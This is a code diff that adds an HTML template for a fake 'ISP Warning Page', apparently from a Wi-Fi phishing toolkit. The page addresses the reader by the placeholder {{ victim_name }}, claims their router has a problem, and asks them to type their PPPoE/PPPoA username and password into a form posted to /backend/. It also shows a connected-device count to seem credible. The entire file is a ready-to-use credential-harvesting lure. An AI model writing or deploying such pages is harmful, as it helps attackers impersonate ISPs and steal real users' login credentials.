@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>ISP Warning Page</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="/static/script.js"></script>
+</head>
+
+<body>
+
+  <p> Dear {{ victim_name }}, This is a message from {{ ISP }}. A problem was detected regarding your {{ target_ap_vendor }} router. </p>
+  <p> Please write your credentials to re-connect over PPPOE/PPPOA.</p>
+
+  <form action="/backend/" method="POST">
+    <input type="text" name="wphshr-username"></input>
+    <input type="text" name="wphshr-password"></input>
+    <input type="submit" value="Submit"></input>
+  </form>
+
+  <p>Number of connected devices: <b>{{ get_connected_devices() }}</b></p>
+
+</body>
+
+</html>
